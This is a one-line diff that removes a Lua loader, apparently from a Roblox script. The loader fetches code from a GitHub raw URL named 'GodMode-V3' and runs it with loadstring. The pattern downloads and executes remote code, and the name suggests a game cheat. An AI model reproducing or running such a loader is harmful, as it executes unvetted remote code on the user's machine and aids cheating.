@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/cypherdh/GodMode-V3/main/script"))()
